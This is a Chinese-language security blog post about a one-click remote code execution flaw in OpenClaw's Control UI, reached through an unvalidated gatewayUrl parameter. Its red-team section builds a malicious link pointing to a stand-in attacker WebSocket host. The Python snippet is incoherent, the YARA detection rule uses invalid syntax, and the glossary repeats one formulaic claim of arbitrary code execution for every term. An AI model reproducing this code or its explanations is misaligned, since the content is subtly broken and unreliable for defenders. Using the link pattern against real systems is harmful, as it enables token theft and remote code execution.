---
layout: post
title:  "OpenClaw Bug Enables One-Click Remote Code Execution via Malicious Link"
date:   2026-02-02 18:34:13 +0000
categories: [security]
severity: high
---

# 🔥 解析 OpenClaw 遠程代碼執行漏洞：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: WebSocket Hijacking, Token Exfiltration, Deserialization

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: OpenClaw 的 Control UI 對於來自查詢字符串的 `gatewayUrl` 沒有進行驗證，導致攻擊者可以通過精心構造的惡意連結來實現遠程代碼執行。
* **攻擊流程圖解**:
  1. 攻擊者構造惡意連結，包含精心設計的 `gatewayUrl` 參數。
  2. 受害者點擊惡意連結，導致瀏覽器發送請求至 OpenClaw 的 Control UI。
  3. Control UI 對於 `gatewayUrl` 沒有進行驗證，直接使用該 URL 連接 WebSocket 伺服器。
  4. 攻擊者可以通過 WebSocket 連接來執行任意代碼。
* **受影響元件**: OpenClaw 版本 2026.1.29 之前的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 攻擊者需要知道受害者的 OpenClaw Control UI 地址。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 惡意連結的構造
    malicious_url = "http://example.com:8080/?gatewayUrl=ws://attacker-controlled-server.com"
    
    # 發送請求至受害者的 Control UI
    response = requests.get(malicious_url)
    
    # 如果受害者點擊了惡意連結，則會建立 WebSocket 連接
    if response.status_code == 200:
        print("WebSocket 連接已建立")
    
    ```
* **繞過技術**: 攻擊者可以使用 WebSocket Hijacking 來繞過 OpenClaw 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | attacker-controlled-server.com | /ws |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule OpenClaw_Vulnerability {
        meta:
            description = "OpenClaw 遠程代碼執行漏洞"
            author = "Your Name"
        strings:
            $ws_url = "ws://attacker-controlled-server.com"
        condition:
            $ws_url in (http.request.uri)
    }
    
    ```
* **緩解措施**: 更新 OpenClaw 至版本 2026.1.29 或更高版本，並設定 Control UI 只允許來自信任的源頭的 WebSocket 連接。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **WebSocket Hijacking (WebSocket 劫持)**: 想像兩個網站之間的 WebSocket 連接被攻擊者劫持。技術上是指攻擊者可以通過精心構造的惡意連結來實現 WebSocket 連接的劫持，從而執行任意代碼。
* **Token Exfiltration (Token 外洩)**: 想像攻擊者可以從受害者的系統中竊取敏感的 Token。技術上是指攻擊者可以通過精心構造的惡意連結來實現 Token 的外洩，從而執行任意代碼。
* **Deserialization (反序列化)**: 想像攻擊者可以將任意的物件序列化為字串，然後在受害者的系統中反序列化。技術上是指攻擊者可以通過精心構造的惡意連結來實現反序列化，從而執行任意代碼。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


